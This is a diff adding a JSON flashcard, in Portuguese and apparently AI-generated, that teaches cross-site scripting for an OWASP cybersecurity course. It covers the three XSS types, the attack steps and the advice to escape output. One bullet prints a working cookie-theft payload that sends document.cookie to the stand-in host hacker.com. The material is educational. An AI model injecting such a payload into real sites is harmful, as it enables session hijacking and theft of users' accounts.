@@ -1,0 +1,65 @@
+{
+  "id": 351,
+  "title": "CROSS-SITE SCRIPTING (XSS)",
+  "definition": "É quando um site deixa um invasor injetar um script malicioso que roda no navegador de outra pessoa.",
+  "topLeft": {
+    "pill": "IDEIA CENTRAL",
+    "icon": "💡",
+    "bullets": [
+      "O site confia demais no que o usuário digita e acaba executando código estranho."
+    ]
+  },
+  "topRight": {
+    "pill": "3 TIPOS DE XSS",
+    "icon": "🖥️",
+    "bullets": [
+      "Reflected: o script vem na URL e volta na resposta da página.",
+      "Stored: o script fica salvo no banco e ataca todo mundo que visitar.",
+      "DOM: o script é injetado só no navegador, via JavaScript, sem passar pelo servidor."
+    ]
+  },
+  "midRight": {
+    "pill": "CÓDIGO MALICIOSO",
+    "icon": "{ }",
+    "bullets": [
+      "O invasor injeta uma tag script no campo de comentário ou busca.",
+      "<script>document.location='http://hacker.com?c='+document.cookie</script>"
+    ]
+  },
+  "bottomRight": {
+    "pill": "ONDE ACONTECE",
+    "icon": "</>",
+    "bullets": [
+      "Caixas de comentário, busca, perfil de usuário e formulários sem filtro.",
+      "Comum em apps feitos com PHP, JS puro, ou frameworks configurados errado."
+    ]
+  },
+  "bottomCenter": {
+    "pill": "COMO O ATAQUE FUNCIONA",
+    "icon": "⚙️",
+    "bullets": [
+      "PASSO 1: Invasor envia um link ou comentário com script escondido",
+      "PASSO 2: Vítima abre a página e o navegador executa o script sem suspeitar",
+      "PASSO 3: Script rouba o cookie da vítima e envia para o invasor"
+    ]
+  },
+  "bottomLeft": {
+    "pill": "PEGADINHAS COMUNS",
+    "icon": "⚠️",
+    "bullets": [
+      "Achar que só sites 'feios' têm XSS, qualquer campo de texto é um risco.",
+      "Dica de ouro: nunca confie no que o usuário digitou, sempre escape a saída."
+    ]
+  },
+  "midLeft": {
+    "pill": "RESUMO EXPRESSO",
+    "icon": "💬",
+    "bullets": [
+      "Usuário digita script ➔ site exibe sem filtrar ➔ navegador executa e rouba dados."
+    ]
+  },
+  "_modelo_usado": "claude-sonnet-5[1m]",
+  "modulo": "OWASP",
+  "escola": "08_ciberseguranca",
+  "foco_pedagogico": "Injeção de scripts maliciosos no navegador de terceiros e roubo de cookies"
+}
